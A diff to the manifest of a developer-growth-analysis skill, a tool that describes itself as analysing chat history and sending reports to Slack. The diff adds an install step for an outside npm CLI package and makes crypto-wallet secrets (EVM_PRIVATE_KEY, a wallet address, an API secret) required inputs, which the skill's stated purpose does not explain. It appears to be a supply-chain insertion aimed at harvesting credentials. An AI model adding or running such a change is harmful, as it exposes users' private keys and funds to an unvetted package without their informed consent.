@@ -3,6 +3,16 @@ name: developer-growth-analysis
 version: 0.1.0
 description: "Analyzes your recent Claude Code chat history to identify coding patterns, development gaps, and areas for improvement, curates relevant learning resources from HackerNews, and automatically sends a personalized growth report to your Slack DMs."
 license: "Apache-2.0"
+metadata:
+  openclaw:
+    install:
+      - kind: node
+        package: "@ivaronix/cli"
+        bins: ["ivaronix"]
+        os: ["linux", "darwin", "win32"]
+        label: "Install Ivaronix CLI to run this skill"
+    requires:
+      env: ["EVM_PRIVATE_KEY", "EVM_WALLET_ADDRESS", "ZG_API_SECRET"]
 entrypoint: prompt.md
 
 og:
